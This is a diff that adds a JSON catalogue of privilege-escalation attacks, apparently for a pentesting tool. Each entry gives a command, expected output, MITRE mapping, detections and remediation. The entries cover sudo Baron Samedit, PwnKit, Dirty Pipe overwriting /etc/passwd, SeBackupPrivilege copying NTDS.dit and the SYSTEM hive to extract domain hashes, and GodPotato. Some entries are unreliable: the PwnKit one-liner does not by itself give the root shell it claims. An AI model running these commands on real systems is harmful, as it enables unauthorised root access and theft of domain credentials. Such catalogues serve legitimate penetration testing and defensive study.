@@ -1,0 +1,246 @@
+[
+  {
+    "id": "linux-sudo-cve",
+    "tool": "manual",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "sudo -V && sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')",
+    "name": "Sudo CVE-2021-3156 (Baron Samedit)",
+    "description": "Exploits heap overflow in sudo for instant root \u2014 affects sudo < 1.9.5p2.",
+    "arguments": {
+      "sudo -V": "Check version",
+      "sudoedit -s": "Trigger vulnerability"
+    },
+    "expected_output": "# If vulnerable:\n# Segmentation fault (exploitable)\n# Use exploit: https://github.com/blasty/CVE-2021-3156",
+    "use_case": "Instant root on unpatched systems \u2014 one of the most impactful Linux privesc CVEs.",
+    "prerequisites": [
+      "sudo < 1.9.5p2"
+    ],
+    "mitre_mapping": [
+      "T1068"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "Unusual sudoedit crashes",
+      "Exploit binary execution"
+    ],
+    "remediation": [
+      "Update sudo immediately"
+    ],
+    "common_mistakes": [
+      "sudo already patched"
+    ],
+    "alternatives": [
+      "linpeas (checks version)",
+      "linux-exploit-suggester"
+    ],
+    "references": [
+      "https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit"
+    ],
+    "tags": [
+      "sudo",
+      "cve",
+      "heap-overflow",
+      "instant-root"
+    ]
+  },
+  {
+    "id": "linux-polkit-cve",
+    "tool": "manual",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "# CVE-2021-4034 (PwnKit):\npython3 -c 'import os;os.execvp(\"pkexec\",[\"\"]);'",
+    "name": "PwnKit (CVE-2021-4034)",
+    "description": "Exploits pkexec SUID binary for instant root \u2014 affects almost all Linux distros.",
+    "arguments": {
+      "pkexec": "Polkit's pkexec binary (SUID)"
+    },
+    "expected_output": "# whoami\nroot",
+    "use_case": "Instant root on nearly all unpatched Linux systems \u2014 trivial to exploit.",
+    "prerequisites": [
+      "pkexec installed with SUID (default)",
+      "Unpatched polkit"
+    ],
+    "mitre_mapping": [
+      "T1068"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "pkexec execution with unusual arguments"
+    ],
+    "remediation": [
+      "Patch polkit",
+      "Remove SUID from pkexec"
+    ],
+    "common_mistakes": [
+      "Already patched"
+    ],
+    "alternatives": [
+      "metasploit exploit/linux/local/cve_2021_4034_pwnkit"
+    ],
+    "references": [
+      "https://github.com/berdav/CVE-2021-4034"
+    ],
+    "tags": [
+      "pwnkit",
+      "polkit",
+      "pkexec",
+      "cve",
+      "instant-root"
+    ]
+  },
+  {
+    "id": "linux-dirty-pipe",
+    "tool": "manual",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "linux"
+    ],
+    "command": "# CVE-2022-0847 (Dirty Pipe):\n./exploit /etc/passwd 1 '${openssl_hash}'",
+    "name": "Dirty Pipe (CVE-2022-0847)",
+    "description": "Overwrites read-only files via pipe buffer manipulation \u2014 kernel 5.8 to 5.16.11.",
+    "arguments": {
+      "exploit": "Compiled exploit binary",
+      "/etc/passwd": "Target file"
+    },
+    "expected_output": "# Overwrites /etc/passwd with new root entry\n# su hacker \u2192 root",
+    "use_case": "Overwrite any file regardless of permissions \u2014 modify /etc/passwd for root.",
+    "prerequisites": [
+      "Kernel 5.8 - 5.16.11",
+      "Compiled exploit"
+    ],
+    "mitre_mapping": [
+      "T1068"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "File modification without write permission",
+      "Kernel exploit indicators"
+    ],
+    "remediation": [
+      "Update kernel",
+      "Monitor file integrity"
+    ],
+    "common_mistakes": [
+      "Kernel not in vulnerable range"
+    ],
+    "alternatives": [
+      "linpeas",
+      "linux-exploit-suggester"
+    ],
+    "references": [
+      "https://dirtypipe.cm4all.com"
+    ],
+    "tags": [
+      "dirty-pipe",
+      "kernel",
+      "file-overwrite",
+      "cve"
+    ]
+  },
+  {
+    "id": "windows-sebackup",
+    "tool": "manual",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "# With SeBackupPrivilege:\nrobocopy /B C:\\Windows\\NTDS . ntds.dit\nreg save HKLM\\SYSTEM system.bak",
+    "name": "SeBackupPrivilege Abuse",
+    "description": "Abuses SeBackupPrivilege to copy NTDS.dit and SYSTEM hive for offline hash extraction.",
+    "arguments": {
+      "/B": "Backup mode (bypasses ACLs)",
+      "reg save": "Save registry hive"
+    },
+    "expected_output": "# Then on attacker:\nimpacket-secretsdump -ntds ntds.dit -system system.bak LOCAL",
+    "use_case": "Extract all domain hashes by abusing backup privileges to copy protected files.",
+    "prerequisites": [
+      "SeBackupPrivilege assigned"
+    ],
+    "mitre_mapping": [
+      "T1003.003"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "Backup of NTDS.dit",
+      "Registry hive export"
+    ],
+    "remediation": [
+      "Restrict SeBackupPrivilege",
+      "Monitor NTDS.dit access"
+    ],
+    "common_mistakes": [
+      "Privilege not assigned"
+    ],
+    "alternatives": [
+      "diskshadow + robocopy",
+      "wbadmin"
+    ],
+    "references": [
+      "https://book.hacktricks.wiki/en/windows-hardening/privilege-escalation"
+    ],
+    "tags": [
+      "sebackup",
+      "ntds",
+      "privilege",
+      "domain-hashes"
+    ]
+  },
+  {
+    "id": "windows-seimpersonate-godpotato",
+    "tool": "godpotato",
+    "category": "privilege_escalation",
+    "phase": 6,
+    "os": [
+      "windows"
+    ],
+    "command": "GodPotato.exe -cmd 'cmd /c whoami'",
+    "name": "GodPotato (Latest Potato)",
+    "description": "Latest potato exploit \u2014 works on Windows 10/11/Server 2022 with SeImpersonatePrivilege.",
+    "arguments": {
+      "-cmd": "Command to run as SYSTEM"
+    },
+    "expected_output": "[+] Exploit successful!\nnt authority\\system",
+    "use_case": "Most reliable modern potato exploit \u2014 works where JuicyPotato and PrintSpoofer fail.",
+    "prerequisites": [
+      "SeImpersonatePrivilege"
+    ],
+    "mitre_mapping": [
+      "T1134"
+    ],
+    "mitre_tactic": "Privilege Escalation",
+    "detections": [
+      "COM object manipulation",
+      "Token impersonation"
+    ],
+    "remediation": [
+      "Remove SeImpersonatePrivilege"
+    ],
+    "common_mistakes": [
+      "Privilege not available"
+    ],
+    "alternatives": [
+      "PrintSpoofer",
+      "SweetPotato",
+      "JuicyPotato"
+    ],
+    "references": [
+      "https://github.com/BeichenDream/GodPotato"
+    ],
+    "tags": [
+      "godpotato",
+      "seimpersonate",
+      "system",
+      "latest",
+      "potato"
+    ]
+  }
+]
